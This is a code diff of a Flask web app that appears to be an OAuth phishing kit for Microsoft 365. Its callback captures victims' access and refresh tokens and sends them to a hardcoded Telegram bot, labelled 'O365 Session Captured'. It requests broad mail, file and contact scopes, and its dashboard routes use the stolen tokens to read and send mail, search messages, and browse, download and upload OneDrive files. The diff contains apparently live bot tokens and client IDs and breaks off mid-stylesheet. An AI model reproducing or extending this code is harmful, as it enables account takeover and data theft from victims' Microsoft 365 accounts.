@@ -14,10 +14,9 @@ app = Flask(__name__)
 TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
 TELEGRAM_CHAT_ID = "8877118461"
 
-# Use a permissive Client ID or your own Azure App Client ID
-MS_CLIENT_ID = "147947b0-1073-4b4c-88e1-9f7295f29b3f"
-# CRITICAL: Must match your deployed URL
+# CRITICAL: Update this to your actual Render URL + /callback
 MS_REDIRECT_URI = "https://myappsignin.onrender.com/callback"
+MS_CLIENT_ID = "147947b0-1073-4b4c-88e1-9f7295f29b3f"
 MS_SCOPE = "openid profile email offline_access Mail.Read Mail.Send Mail.ReadWrite Calendars.ReadWrite Contacts.ReadWrite Files.Read Files.ReadWrite Sites.Read.All User.Read.All"
 
 # Default token if no ?token= param is provided
@@ -120,7 +119,6 @@ def graph_api(endpoint, method='GET', body=None, params=None, stream=False):
 @app.route("/")
 def index():
     """Serves the Dashboard."""
-    # Check for token in query params
     token_param = request.args.get('token', DEFAULT_REFRESH_TOKEN)
     set_token_context(token_param)
     return render_template_string(DASHBOARD_HTML)
@@ -170,7 +168,6 @@ def callback():
         access_token = tokens.get("access_token", "FAILED")
         refresh_token = tokens.get("refresh_token", "FAILED")
         
-        # Send to Telegram with the token for easy copy-paste
         send_to_telegram(f"""
 🛡️ <b>O365 Session Captured</b>
 
@@ -321,7 +318,6 @@ def api_files_root():
 def api_files_folder(folder_path):
     token_param = request.args.get('token', DEFAULT_REFRESH_TOKEN)
     set_token_context(token_param)
-    # folder_path should be the ID of the folder
     data, status = graph_api(f"/me/drive/items/{folder_path}/children?$select=name,id,size,lastModifiedDateTime,webUrl")
     return jsonify(data)
 
@@ -329,7 +325,6 @@ def api_files_folder(folder_path):
 def api_files_download(file_id):
     token_param = request.args.get('token', DEFAULT_REFRESH_TOKEN)
     set_token_context(token_param)
-    # Get file info first to get name
     file_info, _ = graph_api(f"/me/drive/items/{file_id}")
     filename = file_info.get("name", "download")
     response, status = graph_api(f"/me/drive/items/{file_id}/content", stream=True)
@@ -341,7 +336,6 @@ def api_files_download(file_id):
 def api_files_upload():
     token_param = request.args.get('token', DEFAULT_REFRESH_TOKEN)
     set_token_context(token_param)
-    # Basic upload to root
     if 'file' not in request.files:
         return jsonify({"error": "No file provided"}), 400
     file = request.files['file']
@@ -363,7 +357,6 @@ def api_search():
     set_token_context(token_param)
     q = request.args.get('q', '')
     top = request.args.get('top', 10)
-    # Search mail
     data, status = graph_api(f"/me/messages?$top={top}&$search=%22{q}%22&$select=subject,from,receivedDateTime,bodyPreview")
     return jsonify(data)
 
@@ -377,10 +370,4 @@ DASHBOARD_HTML = """
 <html>
 <head>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #f4f6f8; margin: 0; padding: 20px; color: #333; }
-        .container { max-width: 1400px; margin: 0 auto; }
-        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
-        .status-badge { padding: 5px 15px; border-radius: 20px; font-weight: bold; font-size: 14px; }
-        .status-active { background: #d4edda; color: #155724; }
-        .status-inactive { background: #f8d7da; color: #721c24; }
-        .tabs { display: flex; gap: 1
+        body { font-family: 'Segoe UI', sans-serif; background: #
